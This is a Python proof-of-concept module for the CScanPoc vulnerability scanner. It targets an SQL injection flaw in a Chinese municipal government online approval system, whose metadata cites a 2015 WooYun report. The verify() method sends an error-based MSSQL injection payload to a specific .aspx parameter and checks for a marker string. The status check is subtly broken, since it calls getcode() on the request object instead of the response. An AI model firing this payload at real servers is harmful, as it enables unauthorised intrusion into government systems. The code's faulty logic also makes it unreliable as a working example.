# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib2

class Vuln(ABVuln):
    poc_id = 'd0c39661-18e0-4f1d-9675-0ac9a5c0bac0'
    name = '邯郸市连邦软件政府网上审批系统sql注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-06-28'  # 漏洞公布时间
    desc = '''
        邯郸市连邦软件政府网上审批系统sql注入漏洞。
        workplate/xzsp/gxxt/tjfx/sxlist.aspx?baseorg=
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = '连邦软件'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '4dc3b877-f146-45d6-bfaa-6e4cf07b0c12'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-16'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #ref: http://www.wooyun.org/bugs/wooyun-2010-0122708
            payload = "/workplate/xzsp/gxxt/tjfx/sxlist.aspx?baseorg=convert(int,%27tes%27%2b%27tvul%27)"
            verify_url = self.target + payload
            req = urllib2.Request(verify_url)
            content = urllib2.urlopen(req).read()

            if req.getcode() == 500 and 'testvul' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
